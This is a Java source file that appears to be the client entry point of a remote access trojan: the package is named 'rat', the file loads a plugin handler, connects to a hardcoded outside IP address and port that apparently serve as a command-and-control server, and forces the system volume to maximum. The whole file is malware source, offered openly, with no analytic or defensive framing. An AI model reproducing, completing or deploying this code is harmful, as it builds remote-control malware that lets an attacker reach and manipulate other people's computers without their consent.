package rat;

import rat.packets.PluginHandler;
import rat.plugins.volume.VolumeUtil;

public class ClientMain
{
    public static PluginHandler pluginHandler;

    public static void main(String[] args)
    {
        pluginHandler = new PluginHandler();
        new Client("128.189.152.58", 5403);

        VolumeUtil.setVolume(100);
    }

    public static PluginHandler getPluginHandler()
    {
        return pluginHandler;
    }
}
